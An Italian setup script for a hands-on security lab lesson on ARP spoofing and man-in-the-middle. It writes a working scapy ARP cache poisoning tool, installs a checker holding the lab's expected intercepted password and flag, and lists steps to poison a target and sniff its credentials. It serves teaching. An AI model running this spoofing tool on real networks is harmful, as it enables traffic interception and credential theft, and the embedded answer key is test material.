#!/usr/bin/env bash
# Lezione 25 · lato Kali · ARP spoofing e MITM con scapy (tool). Idempotente.
set -uo pipefail

UTENTE="${SUDO_USER:-$USER}"
HOME_UTENTE="$(getent passwd "$UTENTE" | cut -d: -f6)"
[ -z "$HOME_UTENTE" ] && HOME_UTENTE="/home/$UTENTE"
DIR="$HOME_UTENTE/lab/lezione-25"

echo "== Lezione 25 · ARP spoofing e MITM con scapy =="
mkdir -p "$DIR"

cat > "$DIR/arpspoof.py" <<'PY'
#!/usr/bin/env python3
# arpspoof.py - si finge un altro host avvelenando la cache ARP della vittima.
# Uso:  sudo python3 arpspoof.py <ip_vittima> <ip_da_impersonare> [iface]
#   es: sudo python3 arpspoof.py 10.10.10.20 10.10.10.30 eth1
# Dice in continuazione alla vittima: "l'IP <da_impersonare> ha il MIO MAC".
import sys, time
from scapy.all import ARP, send, getmacbyip

vittima = sys.argv[1] if len(sys.argv) > 1 else "10.10.10.20"
impersona = sys.argv[2] if len(sys.argv) > 2 else "10.10.10.30"
iface = sys.argv[3] if len(sys.argv) > 3 else None

mac_vittima = getmacbyip(vittima)
if not mac_vittima:
    print("[!] Non trovo il MAC della vittima %s. E' accesa?" % vittima)
    sys.exit(1)

print("[*] Avveleno la cache di %s: %s ora ha il MIO MAC. Ctrl+C per fermare." %
      (vittima, impersona))
pkt = ARP(op=2, pdst=vittima, hwdst=mac_vittima, psrc=impersona)
try:
    while True:
        send(pkt, iface=iface, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Fermato. (In un attacco reale qui si ripristina la cache.)")
PY
chmod +x "$DIR/arpspoof.py"
chown -R "$UTENTE:$UTENTE" "$HOME_UTENTE/lab" 2>/dev/null || true

cat > /usr/local/bin/lab25-verifica <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
if [ "$(echo "${1:-}" | tr 'A-Z' 'a-z')" = "casseffort3!" ] || [ "${1:-}" = "CasseforT3!" ]; then
  echo "[OK] Hai intercettato le credenziali dirottando il traffico!"
  echo "FLAG{mitm_riuscito}"
else
  echo "[--] No. Intercetta il traffico del bersaglio verso 10.10.10.30 e leggi la password."
fi
EOF
chmod 755 /usr/local/bin/lab25-verifica

python3 -c "import scapy" 2>/dev/null && echo "[OK] scapy presente." || echo "[--] scapy mancante."

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Mettersi in mezzo (man in the middle)
------------------------------------------------------------
 Il bersaglio manda credenziali a un "server centrale" 10.10.10.30 che
 NON esiste. Se ti fingi tu quel server (ARP spoofing), quel traffico
 arriva a te. Trova l'interfaccia interna:  ip -br addr  (di solito eth1)

 [ ] 1  Avvelena la cache ARP del bersaglio                    (avvio)
        cd ~/lab/lezione-25
        cat arpspoof.py
        sudo python3 arpspoof.py 10.10.10.20 10.10.10.30 eth1
        # lascialo girare in questo terminale

 [ ] 2  In un ALTRO terminale, intercetta il traffico          (+40)
        sudo tcpdump -i eth1 -A udp port 9997
        # ora che sei "10.10.10.30", vedi i pacchetti del bersaglio: c'e' la flag

 [ ] 3  Leggi la password dirottata                            (+30)
        lab25-verifica <la-password-che-hai-intercettato>

 Concetti:  ARP  cache poisoning  gratuitous ARP  man-in-the-middle
 Etica: SOLO nel laboratorio. L'ARP spoofing su reti altrui e' reato.
------------------------------------------------------------
MSG
